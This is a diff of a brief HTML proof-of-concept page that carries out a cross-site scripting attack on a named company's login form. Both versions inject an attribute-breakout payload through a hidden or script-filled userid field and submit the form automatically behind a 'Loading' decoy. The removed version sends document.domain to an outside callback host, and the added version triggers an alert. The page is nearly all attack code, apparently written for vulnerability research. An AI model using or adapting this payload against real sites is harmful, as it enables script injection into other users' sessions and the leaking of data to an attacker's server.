@@ -1,19 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+  <head>
+    <title>XSS Auto-Submit PoC</title>
+  </head>
   <body>
-    <form id="xssform" action="https://central.dyson.com/" method="POST" target="attackwindow">
-      <input type="hidden" name="userid" value='" autofocus onfocus="new Image().src=`http://413tzxz2kbiy4n5arvt6s7drliraf33s.oastify.com?d=`+document.domain">
-      <input type="hidden" name="password" value="x">
-      <input type="hidden" name="mode" value="Login">
+    <h2>Loading... Please wait</h2>
+
+    <form id="attackForm" action="https://central-test.dyson.com/" method="POST">
+      <input type="text" name="userid" id="userid">
+      <input type="submit">
     </form>
 
     <script>
-      const win = window.open('', 'attackwindow');
-      if (win) {
-        document.getElementById('xssform').submit();
-      } else {
-        document.write('Popup blocked. Please allow popups and refresh the page.');
-      }
+      // Inject XSS payload
+      document.getElementById("userid").value = `" autofocus onfocus="alert(document.domain)"`;
+
+      // Auto-submit the form
+      document.getElementById("attackForm").submit();
     </script>
   </body>
 </html>
